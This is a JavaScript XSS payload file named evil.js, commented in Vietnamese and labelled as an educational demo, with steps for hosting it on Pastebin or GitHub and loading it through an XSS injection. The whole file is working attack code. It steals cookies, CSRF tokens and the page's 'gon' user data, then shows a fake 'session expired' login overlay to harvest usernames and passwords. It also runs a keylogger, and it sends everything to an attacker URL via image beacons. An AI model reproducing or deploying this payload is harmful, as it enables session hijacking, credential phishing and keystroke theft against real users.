// ============================================================
// evil.js - File JS demo cho XSS test (MỤC ĐÍCH GIÁO DỤC)
// 
// LƯU Ý: Cập nhật URL server nhận dữ liệu tại đây:
// var ATTACKER_URL = "http://localhost:9000/steal";
//
// Cách dùng:
// 1. Chạy server: py attacker_server.py
// 2. Upload file này lên GitHub/Pastebin
// 3. Dùng payload XSS để tải file này
// 4. Dữ liệu sẽ được gửi về server tự động
// ============================================================

(function() {
  'use strict';

  // ⚙️ THAY ĐỔI URL SERVER NHẬN DỮ LIỆU TẠI ĐÂY
  var ATTACKER_URL = "http://localhost:9000/steal";

  // ============================================================
  // 1. THU THẬP THÔNG TIN
  // ============================================================
  var info = {
    url: window.location.href,
    domain: document.domain,
    title: document.title,
    userAgent: navigator.userAgent,
    time: new Date().toISOString()
  };

  // Đọc cookie
  var cookies = document.cookie || "không có cookie";

  // Đọc CSRF token
  var csrfMeta = document.querySelector('meta[name="csrf-token"]');
  var csrfToken = csrfMeta ? csrfMeta.content : 'KHÔNG TÌM THẤY';

  // Đọc dữ liệu gon (thông tin người dùng)
  var gonData = {};
  try {
    if (typeof gon !== 'undefined') {
      gonData = {
        user_id: gon.user_id,
        user_name: gon.user_name || gon.username,
        organization: gon.organization,
        leader_roles: gon.leader_roles,
        faculty: gon.faculty,
        roles: gon.roles
      };
    }
  } catch(e) {}

  console.log('🔴 XSS LOADED FROM EXTERNAL FILE');
  console.log('  URL:', info.url);
  console.log('  Cookie:', cookies);
  console.log('  CSRF:', csrfToken);
  console.log('  GON:', gonData);

  // ============================================================
  // 2. GỬI DỮ LIỆU VỀ SERVER (tự động)
  // ============================================================
  function sendToServer(data, prefix) {
    // Dùng new Image() để gửi GET request - không bị CORS chặn
    var img = new Image();
    var params = [];
    for (var key in data) {
      params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    img.src = ATTACKER_URL + '?' + prefix + '&' + params.join('&');
  }

  // Gửi cookie + CSRF + thông tin ngay khi load
  sendToServer({
    cookies: cookies,
    csrf: csrfToken,
    url: info.url,
    domain: info.domain,
    title: info.title,
    userAgent: info.userAgent,
    gon: JSON.stringify(gonData),
    time: info.time
  }, 'init');

  // ============================================================
  // 3. TẠO FORM GIẢ MẠO (PHISHING)
  // ============================================================
  function createPhishingForm() {
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;';

    var form = document.createElement('div');
    form.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;box-shadow:0 4px 20px rgba(0,0,0,0.3);font-family:Arial,sans-serif;';
    form.innerHTML =
      '<h2 style="text-align:center;color:#1976d2;margin:0 0 15px 0;">Đăng Nhập</h2>' +
      '<p style="text-align:center;color:#666;font-size:13px;margin:0 0 15px 0;">Phiên làm việc hết hạn. Vui lòng đăng nhập lại.</p>' +
      '<input type="text" id="xss-user" placeholder="Tên đăng nhập" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">' +
      '<input type="password" id="xss-pass" placeholder="Mật khẩu" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">' +
      '<button id="xss-btn" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px;">Xác nhận</button>';

    overlay.appendChild(form);
    document.body.appendChild(overlay);

    document.getElementById('xss-btn').onclick = function() {
      var user = document.getElementById('xss-user').value;
      var pass = document.getElementById('xss-pass').value;

      // Gửi credentials về server
      sendToServer({
        username: user,
        password: pass,
        cookies: cookies,
        csrf: csrfToken,
        page_url: info.url
      }, 'credentials');

      alert('Xác thực thành công!');
      overlay.remove();
    };
  }

  // ============================================================
  // 4. KEYLOGGER
  // ============================================================
  function startKeylogger() {
    var keys = [];
    document.addEventListener('keydown', function(e) {
      keys.push(e.key);
      if (keys.length >= 20) {
        sendToServer({
          keys: keys.join(''),
          url: info.url
        }, 'keylog');
        keys = [];
      }
    });
    console.log('🔴 KEYLOGGER ĐÃ BẮT ĐẦU');
  }

  // ============================================================
  // 5. CHẠY TẤT CẢ CHỨC NĂNG
  // ============================================================
  setTimeout(createPhishingForm, 1500);  // Form hiện sau 1.5s
  startKeylogger();

  // ============================================================
  // TÓM TẮT:
  // 1. ✅ Thu thập cookie, CSRF token, dữ liệu gon
  // 2. ✅ Gửi về server qua GET request (new Image())
  // 3. ✅ Form phishing đăng nhập giả mạo
  // 4. ✅ Keylogger ghi phím bấm
  // 5. ✅ Có thể mở rộng: tải file qua API
  // ============================================================
})();
